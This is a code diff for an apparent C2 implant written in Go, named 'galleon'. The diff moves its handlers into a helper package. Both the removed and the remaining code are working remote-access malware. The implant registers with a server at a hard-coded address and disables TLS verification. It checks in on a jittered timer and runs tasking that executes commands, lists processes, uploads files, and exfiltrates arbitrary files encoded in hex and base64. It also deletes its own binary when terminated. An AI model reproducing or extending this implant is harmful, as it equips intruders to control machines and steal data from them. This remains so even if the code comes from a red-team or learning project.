@@ -1,175 +1,11 @@
 package main
 
 import (
-	"bytes"
-	"compress/gzip"
-	"crypto/tls"
-	"encoding/base64"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"io"
-	"net/http"
-	"os"
-	"strconv"
-	"strings"
+	"galleon/agent_helper"
 	"time"
 )
-
-var callbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20, StartDelay: 5}
-
-var customClient = &http.Client{
-	Transport: &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		DisableKeepAlives: true,
-	},
-	Timeout: 10 * time.Second,
-}
-
-type ResultsCreate struct {
-	TaskingID float64 `json:"tasking_id"`
-	Session   string  `json:"session"`
-	Task      string  `json:"task"`
-	Args      string  `json:"args"`
-	Results   string  `json:"results"`
-}
-
-func encodeToBaseHexString(input string) string {
-	encodedBase64 := base64.StdEncoding.EncodeToString([]byte(input))
-	encodedHex := hex.EncodeToString([]byte(encodedBase64))
-	return encodedHex
-}
-
-func decodeFromHexBaseString(input string) (string, error) {
-	decodedHex, err := hex.DecodeString(input)
-	if err != nil {
-		return "", err
-	}
-	decodedBase, err := base64.StdEncoding.DecodeString(string(decodedHex))
-	if err != nil {
-		return "", err
-	}
-	return string(decodedBase), nil
-}
-
-func encodeBytesToBaseHexString(input []byte) string {
-	encodedBase64 := base64.StdEncoding.EncodeToString(input)
-	encodedHex := hex.EncodeToString([]byte(encodedBase64))
-	return encodedHex
-}
-
-func decodeUpload(input string) ([]byte, error) {
-	decHex, err := hex.DecodeString(input)
-	if err != nil {
-		return nil, err
-	}
-	decBase, err := base64.StdEncoding.DecodeString(string(decHex))
-	if err != nil {
-		return nil, err
-	}
-	gzipData, err := gzip.NewReader(bytes.NewReader(decBase))
-	if err != nil {
-		return nil, err
-	}
-	defer gzipData.Close()
-	var out bytes.Buffer
-	if _, err := io.Copy(&out, gzipData); err != nil {
-		return nil, err
-	}
-	return out.Bytes(), nil
-}
-
-func FileTransferShipper(serverUrl string, taskData map[string]interface{}, results []byte) {
-	encodedOutput := encodeBytesToBaseHexString(results)
-	encodedArgs := encodeToBaseHexString(taskData["args"].(string))
-
-	result := ResultsCreate{
-		TaskingID: taskData["id"].(float64),
-		Session:   taskData["session"].(string),
-		Task:      taskData["task"].(string),
-		Args:      encodedArgs,
-		Results:   encodedOutput,
-	}
-	_, _ = PostJson(serverUrl, result)
-
-}
-
-func DataShipper(serverUrl string, taskData map[string]interface{}, results string) {
-	encodedOutput := encodeToBaseHexString(results)
-	encodedArgs := encodeToBaseHexString(taskData["args"].(string))
-
-	result := ResultsCreate{
-		TaskingID: taskData["id"].(float64),
-		Session:   taskData["session"].(string),
-		Task:      taskData["task"].(string),
-		Args:      encodedArgs,
-		Results:   encodedOutput,
-	}
-	_, _ = PostJson(serverUrl, result)
-
-}
-
-func PsHandler(serverUrl string, taskData map[string]interface{}) {
-	processList, err := get_ps()
-	if err != nil {
-		DataShipper(serverUrl, taskData, err.Error())
-		return
-	}
-	DataShipper(serverUrl, taskData, processList)
-}
-
-func ReconfigHandler(serverUrl string, taskData map[string]interface{}) {
-	splitArgs := strings.Split(taskData["args"].(string), " ")
-	callbackTimer.Callback_freq, _ = strconv.Atoi(splitArgs[0])
-	callbackTimer.Jitter, _ = strconv.Atoi(splitArgs[1])
-	callbackTimer.SelfTerminate, _ = strconv.Atoi(splitArgs[2])
-	DataShipper(serverUrl, taskData, "true")
-}
-
-func DownloadHandler(serverUrl string, taskData map[string]interface{}) {
-	inFile, err := os.Open(taskData["args"].(string))
-	if err != nil {
-		DataShipper(serverUrl, taskData, err.Error())
-		return
-	}
-	defer inFile.Close()
-	var buf bytes.Buffer
-
-	gzipWriter := gzip.NewWriter(&buf)
-	defer gzipWriter.Close()
-
-	gzipWriter.Name = taskData["args"].(string)
-	if _, err := io.Copy(gzipWriter, inFile); err != nil {
-		DataShipper(serverUrl, taskData, err.Error())
-		return
-	}
-	if err := gzipWriter.Close(); err != nil {
-		DataShipper(serverUrl, taskData, err.Error())
-		return
-	}
-	FileTransferShipper(serverUrl, taskData, buf.Bytes())
-
-}
-
-func UploadHandler(serverUrl string, taskData map[string]interface{}) {
-	uploadArgsParts := strings.Split(taskData["args"].(string), ":")
-	destFile, err := decodeFromHexBaseString(uploadArgsParts[0])
-	if err != nil {
-		DataShipper(serverUrl, taskData, err.Error())
-	}
-	outputFile, err := decodeUpload(uploadArgsParts[1])
-	if err != nil {
-		DataShipper(serverUrl, taskData, err.Error())
-		return
-	}
-	err = os.WriteFile(destFile, outputFile, os.FileMode(os.O_CREATE|os.O_WRONLY))
-	if err != nil {
-		DataShipper(serverUrl, taskData, err.Error())
-		return
-	}
-	DataShipper(serverUrl, taskData, "true")
-
-}
 
 func ParseTasks(serverUrl string, tasking string) (string, error) {
 
@@ -183,43 +19,26 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 		url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])
 		switch taskData["task"] {
 		case "ls":
-			LsHandler(url, taskData)
+			agent_helper.LsHandler(url, taskData)
 		case "ps":
-			PsHandler(url, taskData)
+			agent_helper.PsHandler(url, taskData)
 		case "exec_bg":
-			ExecBgHandler(url, taskData)
+			agent_helper.ExecBgHandler(url, taskData)
 		case "exec_fg":
-			ExecFgHandler(url, taskData)
+			agent_helper.ExecFgHandler(url, taskData)
 		case "reconfig":
-			ReconfigHandler(url, taskData)
+			agent_helper.ReconfigHandler(url, taskData)
 		case "kill":
-			sendDeathMessage(serverUrl, taskData["session"].(string))
-			DataShipper(url, taskData, "true")
-			TerminateImplant()
+			agent_helper.SendDeathMessage(serverUrl, taskData["session"].(string))
+			agent_helper.DataShipper(url, taskData, "true")
+			agent_helper.TerminateImplant()
 		case "download":
-			DownloadHandler(url, taskData)
+			agent_helper.DownloadHandler(url, taskData)
 		case "upload":
-			UploadHandler(url, taskData)
+			agent_helper.UploadHandler(url, taskData)
 		}
 	}
 	return "", nil
-}
-
-func TerminateImplant() {
-	exePath, err := os.Executable()
-	if err != nil {
-		os.Exit(3)
-	}
-
-	if _, err := os.Stat(exePath); err == nil {
-		err := os.Remove(exePath)
-		if err != nil {
-			os.Exit(2)
-		}
-		os.Exit(1)
-	}
-	// Nothing on disk, just memory
-	os.Exit(0)
 }
 
 func main() {
@@ -227,42 +46,42 @@ func main() {
 	retryCounter := 0
 	serverUrl := "https://192.168.15.25:8000"
 
-	initialInfo := GatherInfo()
+	initialInfo := agent_helper.GatherInfo()
 
-	time.Sleep(time.Duration(callbackTimer.StartDelay) * time.Second)
+	time.Sleep(time.Duration(agent_helper.CallbackTimer.StartDelay) * time.Second)
 
 	// register with server
-	_, err := PostJson(serverUrl+"/implants/", initialInfo)
+	_, err := agent_helper.PostJson(serverUrl+"/implants/", initialInfo)
 	if err != nil {
 		panic(err)
 	}
 
 	// listen for sigterm and sigint (testing only)
-	sigHandler(serverUrl, initialInfo.Session)
+	agent_helper.SigHandler(serverUrl, initialInfo.Session)
 
 	for {
-		nextInterval := RandomJitter(callbackTimer.Callback_freq, callbackTimer.Jitter)
+		nextInterval := agent_helper.RandomJitter(agent_helper.CallbackTimer.Callback_freq, agent_helper.CallbackTimer.Jitter)
 		timer := time.NewTimer(nextInterval)
 
 		<-timer.C
-		resp, err := CheckIn(serverUrl, initialInfo.Session)
+		resp, err := agent_helper.CheckIn(serverUrl, initialInfo.Session)
 		if err != nil {
 			retryCounter += 1
-			if retryCounter >= callbackTimer.SelfTerminate {
-				TerminateImplant()
+			if retryCounter >= agent_helper.CallbackTimer.SelfTerminate {
+				agent_helper.TerminateImplant()
 			}
 			continue
 		}
 		if resp != 200 && resp != 301 {
 			retryCounter += 1
-			if retryCounter >= callbackTimer.SelfTerminate {
-				TerminateImplant()
+			if retryCounter >= agent_helper.CallbackTimer.SelfTerminate {
+				agent_helper.TerminateImplant()
 			}
 			continue
 		}
 		if resp == 301 {
 			// we have tasking
-			tasking, err := FetchTasking(serverUrl, initialInfo.Session)
+			tasking, err := agent_helper.FetchTasking(serverUrl, initialInfo.Session)
 			if err != nil {
 			} else {
 				ParseTasks(serverUrl, tasking)
